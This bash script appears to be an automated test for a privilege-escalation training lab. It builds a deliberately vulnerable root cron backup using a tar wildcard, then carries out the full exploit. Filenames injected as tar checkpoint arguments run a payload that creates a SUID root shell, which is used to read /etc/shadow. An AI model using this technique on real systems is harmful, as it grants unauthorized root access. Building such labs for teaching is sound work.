#!/bin/bash
#
# Automated Test Script for Privilege Escalation Lab v2
# Scenario: Shared Backup Directory → Tar Wildcard Injection → Root
#
# Must be run as root: sudo ./test_lab.sh
#

# Ensure sbin paths are available
export PATH="/usr/sbin:/sbin:$PATH"

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Counters
PASS=0
FAIL=0

# Test user
TEST_USER="developer"
TEST_PASS="developer123"

#######################################
# Logging functions
#######################################
log_header() {
    echo ""
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${CYAN}  $1${NC}"
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
}

log_phase() {
    echo ""
    echo -e "${BLUE}┌──────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ ${BOLD}$1${NC}"
    echo -e "${BLUE}└──────────────────────────────────────────────────────────────┘${NC}"
}

log_step() {
    echo -e "${YELLOW}  ► $1${NC}"
}

log_check() {
    echo -n "    [CHECK] $1 ... "
}

log_pass() {
    echo -e "${GREEN}✓ PASS${NC}"
    PASS=$((PASS + 1))
}

log_fail() {
    echo -e "${RED}✗ FAIL${NC}"
    echo -e "${RED}      Expected: $1${NC}"
    echo -e "${RED}      Got: $2${NC}"
    FAIL=$((FAIL + 1))
}

log_info() {
    echo -e "    ${CYAN}ℹ $1${NC}"
}

log_attack() {
    echo -e "    ${RED}⚔ $1${NC}"
}

#######################################
# Cleanup function
#######################################
cleanup() {
    log_phase "CLEANUP"

    # Kill processes
    pkill -u "$TEST_USER" 2>/dev/null || true

    # Remove user
    userdel -r "$TEST_USER" 2>/dev/null || true

    # Remove backup infrastructure
    rm -f /etc/cron.d/shared-backup 2>/dev/null || true
    rm -f /usr/local/bin/backup-shared.sh 2>/dev/null || true
    rm -rf /var/backups/shared 2>/dev/null || true
    rm -f /var/backups/shared_*.tgz 2>/dev/null || true

    # Remove exploitation artifacts
    rm -f /tmp/rootbash 2>/dev/null || true
    rm -f /tmp/pwned.txt 2>/dev/null || true
    rm -f /root/pwned_by_developer 2>/dev/null || true

    log_info "Cleanup complete"
}

#######################################
# Pre-flight checks
#######################################
preflight() {
    log_phase "PRE-FLIGHT CHECKS"

    log_check "Running as root"
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}✗ FAIL${NC}"
        echo "This script must be run as root (sudo ./test_lab.sh)"
        exit 1
    fi
    log_pass

    log_check "tar command available"
    if command -v tar &> /dev/null; then
        log_pass
    else
        log_fail "tar installed" "tar not found"
        exit 1
    fi

    log_check "useradd command available"
    if command -v useradd &> /dev/null; then
        log_pass
    else
        log_fail "useradd available" "useradd not found"
        exit 1
    fi

    log_step "Cleaning any previous test artifacts..."
    cleanup
}

#######################################
# PHASE 0: Setup environment
#######################################
phase_0() {
    log_phase "PHASE 0 — Environment Setup (Simulating IT Department)"

    log_step "Creating low-privilege developer user..."
    useradd -m -s /bin/bash "$TEST_USER"
    echo "$TEST_USER:$TEST_PASS" | chpasswd

    log_check "Developer user created"
    if id "$TEST_USER" &>/dev/null; then
        log_pass
    else
        log_fail "user exists" "user not found"
    fi

    log_step "Creating shared backup directory..."
    mkdir -p /var/backups/shared
    chmod 1777 /var/backups/shared

    log_check "Shared directory created with correct permissions"
    PERMS=$(stat -c '%a' /var/backups/shared)
    if [[ "$PERMS" == "1777" ]]; then
        log_pass
    else
        log_fail "1777" "$PERMS"
    fi

    log_step "Creating backup script (simulating IT deployment)..."
    cat > /usr/local/bin/backup-shared.sh << 'SCRIPT'
#!/bin/bash
# Nightly backup of user-contributed files
# Deployed by IT Operations - Ticket: ITOPS-4521

BACKUP_DIR="/var/backups/shared"
ARCHIVE="/var/backups/shared_$(date +%Y%m%d_%H%M%S).tgz"

cd "$BACKUP_DIR"
tar czf "$ARCHIVE" *

# Rotate old backups
ls -t /var/backups/shared_*.tgz 2>/dev/null | tail -n +8 | xargs -r rm
SCRIPT

    chmod 755 /usr/local/bin/backup-shared.sh
    chown root:root /usr/local/bin/backup-shared.sh

    log_check "Backup script created and owned by root"
    OWNER=$(stat -c '%U' /usr/local/bin/backup-shared.sh)
    if [[ "$OWNER" == "root" ]]; then
        log_pass
    else
        log_fail "root" "$OWNER"
    fi

    log_step "Creating cron job (runs as root)..."
    echo "*/5 * * * * root /usr/local/bin/backup-shared.sh" > /etc/cron.d/shared-backup
    chmod 644 /etc/cron.d/shared-backup

    log_check "Cron job installed"
    if [[ -f /etc/cron.d/shared-backup ]]; then
        log_pass
    else
        log_fail "cron file exists" "not found"
    fi

    log_step "Adding legitimate user files..."
    echo "Project notes for Q4" > /var/backups/shared/notes.txt
    echo "config_backup=true" > /var/backups/shared/settings.conf
    chown "$TEST_USER:$TEST_USER" /var/backups/shared/notes.txt
    chown "$TEST_USER:$TEST_USER" /var/backups/shared/settings.conf

    log_info "Environment setup complete"
    log_info "Trust boundary: root processes /var/backups/shared with wildcard"
}

#######################################
# PHASE 1: Verify attacker has no privileges
#######################################
phase_1() {
    log_phase "PHASE 1 — Verify Attacker Starts Unprivileged"

    log_check "Developer has no sudo access"
    SUDO_CHECK=$(su - "$TEST_USER" -c 'sudo -l' 2>&1 || true)
    if echo "$SUDO_CHECK" | grep -qi "may not run sudo\|not in the sudoers\|password is required\|not allowed"; then
        log_pass
    else
        log_fail "no sudo" "$SUDO_CHECK"
    fi

    log_check "Developer cannot modify backup script"
    WRITE_CHECK=$(su - "$TEST_USER" -c 'echo test >> /usr/local/bin/backup-shared.sh' 2>&1 || true)
    if echo "$WRITE_CHECK" | grep -qi "permission denied\|cannot create\|not permitted"; then
        log_pass
    else
        log_fail "permission denied" "$WRITE_CHECK"
    fi

    log_check "Developer CAN write to shared directory"
    su - "$TEST_USER" -c 'touch /var/backups/shared/test_write && rm /var/backups/shared/test_write'
    if [[ $? -eq 0 ]]; then
        log_pass
    else
        log_fail "write access" "no write access"
    fi

    log_info "Attacker is unprivileged but has write access to backup directory"
}

#######################################
# PHASE 2: Attacker enumeration
#######################################
phase_2() {
    log_phase "PHASE 2 — Attacker Enumeration"

    log_step "Attacker discovers world-writable directories..."

    log_check "Attacker finds /var/backups/shared"
    FIND_RESULT=$(su - "$TEST_USER" -c 'find /var/backups -type d -perm -0002 2>/dev/null' || true)
    if echo "$FIND_RESULT" | grep -q "/var/backups/shared"; then
        log_pass
    else
        log_fail "/var/backups/shared found" "$FIND_RESULT"
    fi

    log_step "Attacker examines cron jobs..."

    log_check "Attacker can read cron configuration"
    CRON_CONTENT=$(su - "$TEST_USER" -c 'cat /etc/cron.d/shared-backup 2>/dev/null' || true)
    if echo "$CRON_CONTENT" | grep -q "backup-shared.sh"; then
        log_pass
    else
        log_fail "cron readable" "cannot read cron"
    fi

    log_step "Attacker examines backup script..."

    log_check "Backup script uses wildcard (*)"
    SCRIPT_CONTENT=$(su - "$TEST_USER" -c 'cat /usr/local/bin/backup-shared.sh')
    if echo "$SCRIPT_CONTENT" | grep -q 'tar.*\*'; then
        log_pass
    else
        log_fail "wildcard found" "no wildcard"
    fi

    log_info "Attacker identifies: root runs 'tar czf ... *' on writable directory"
    log_info "Attack vector: Tar wildcard injection"
}

#######################################
# PHASE 3: Exploitation
#######################################
phase_3() {
    log_phase "PHASE 3 — Exploitation"

    log_step "Attacker creates payload script..."
    su - "$TEST_USER" -c 'cat > /var/backups/shared/shell.sh << '\''EOF'\''
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
echo "Pwned at $(date)" > /tmp/pwned.txt
chmod 644 /tmp/pwned.txt
EOF'
    su - "$TEST_USER" -c 'chmod +x /var/backups/shared/shell.sh'

    log_check "Payload script created"
    if [[ -f /var/backups/shared/shell.sh ]]; then
        log_pass
    else
        log_fail "shell.sh exists" "not found"
    fi

    log_step "Attacker creates tar argument injection files..."
    su - "$TEST_USER" -c 'touch "/var/backups/shared/--checkpoint=1"'
    su - "$TEST_USER" -c 'touch "/var/backups/shared/--checkpoint-action=exec=sh shell.sh"'

    log_check "--checkpoint=1 file created"
    if [[ -f "/var/backups/shared/--checkpoint=1" ]]; then
        log_pass
    else
        log_fail "file exists" "not found"
    fi

    log_check "--checkpoint-action file created"
    if [[ -f "/var/backups/shared/--checkpoint-action=exec=sh shell.sh" ]]; then
        log_pass
    else
        log_fail "file exists" "not found"
    fi

    log_info "Payload staged in /var/backups/shared/"
    log_attack "When root runs 'tar czf ... *', filenames become arguments"
}

#######################################
# PHASE 4: Trigger and verify
#######################################
phase_4() {
    log_phase "PHASE 4 — Root Executes Attacker Payload"

    log_step "Simulating cron execution (root runs backup script)..."
    /usr/local/bin/backup-shared.sh 2>/dev/null || true

    log_check "/tmp/rootbash exists"
    if [[ -f /tmp/rootbash ]]; then
        log_pass
    else
        log_fail "file exists" "not found (payload did not execute)"
        return
    fi

    log_check "/tmp/rootbash owned by root"
    OWNER=$(stat -c '%U' /tmp/rootbash)
    if [[ "$OWNER" == "root" ]]; then
        log_pass
    else
        log_fail "root" "$OWNER"
    fi

    log_check "/tmp/rootbash has SUID bit (4755)"
    PERMS=$(stat -c '%a' /tmp/rootbash)
    if [[ "$PERMS" == "4755" ]]; then
        log_pass
    else
        log_fail "4755" "$PERMS"
    fi

    log_check "/tmp/pwned.txt created (execution proof)"
    if [[ -f /tmp/pwned.txt ]]; then
        log_pass
        log_info "Contents: $(cat /tmp/pwned.txt)"
    else
        log_fail "file exists" "not found"
    fi

    log_attack "SUID root shell created at /tmp/rootbash"
}

#######################################
# PHASE 5: Prove root access
#######################################
phase_5() {
    log_phase "PHASE 5 — Privilege Escalation Verification"

    if [[ ! -f /tmp/rootbash ]]; then
        log_info "Skipping — SUID shell was not created"
        return
    fi

    log_step "Attacker executes SUID shell..."

    log_check "Developer achieves euid=0 (root)"
    ID_CHECK=$(su - "$TEST_USER" -c '/tmp/rootbash -p -c "id"' 2>&1)
    if echo "$ID_CHECK" | grep -q "euid=0"; then
        log_pass
        log_info "ID output: $ID_CHECK"
    else
        log_fail "euid=0(root)" "$ID_CHECK"
    fi

    log_check "Developer can read /etc/shadow"
    SHADOW_CHECK=$(su - "$TEST_USER" -c '/tmp/rootbash -p -c "head -1 /etc/shadow"' 2>&1)
    if echo "$SHADOW_CHECK" | grep -q ":"; then
        log_pass
    else
        log_fail "shadow content" "$SHADOW_CHECK"
    fi

    log_check "Developer can write to /root"
    su - "$TEST_USER" -c '/tmp/rootbash -p -c "touch /root/pwned_by_developer"' 2>&1
    if [[ -f /root/pwned_by_developer ]]; then
        log_pass
    else
        log_fail "file created" "file not created"
    fi

    echo ""
    log_attack "╔═══════════════════════════════════════════════════════════╗"
    log_attack "║         PRIVILEGE ESCALATION SUCCESSFUL                   ║"
    log_attack "║                                                           ║"
    log_attack "║   Started as:  developer (uid=1001)                       ║"
    log_attack "║   Achieved:    root (euid=0)                              ║"
    log_attack "║   Method:      Tar Wildcard Injection                     ║"
    log_attack "╚═══════════════════════════════════════════════════════════╝"
}

#######################################
# Summary
#######################################
summary() {
    log_header "TEST SUMMARY"

    echo ""
    echo -e "  Tests passed: ${GREEN}${BOLD}$PASS${NC}"
    echo -e "  Tests failed: ${RED}${BOLD}$FAIL${NC}"
    echo ""

    if [[ $FAIL -eq 0 ]]; then
        echo -e "${GREEN}${BOLD}  ╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}${BOLD}  ║           ALL TESTS PASSED — LAB IS FUNCTIONAL            ║${NC}"
        echo -e "${GREEN}${BOLD}  ╚═══════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo "  The lab correctly demonstrates:"
        echo "    1. Unprivileged user with write access to shared directory"
        echo "    2. Root cron job processing directory with wildcard"
        echo "    3. Tar wildcard injection attack"
        echo "    4. Privilege escalation from developer to root"
        echo ""
        echo "  Attack chain:"
        echo "    developer (uid=1001) → tar wildcard injection → root (euid=0)"
        echo ""
    else
        echo -e "${RED}${BOLD}  ╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}${BOLD}  ║              SOME TESTS FAILED — REVIEW OUTPUT            ║${NC}"
        echo -e "${RED}${BOLD}  ╚═══════════════════════════════════════════════════════════╝${NC}"
    fi
}

#######################################
# Main
#######################################
main() {
    log_header "Privilege Escalation Lab v2 — Automated Test"
    echo ""
    echo "  Scenario: Shared Backup Directory"
    echo "  Attack:   Tar Wildcard Injection"
    echo "  Goal:     developer (uid=1001) → root (euid=0)"

    trap cleanup EXIT

    preflight
    phase_0
    phase_1
    phase_2
    phase_3
    phase_4
    phase_5
    summary
}

main "$@"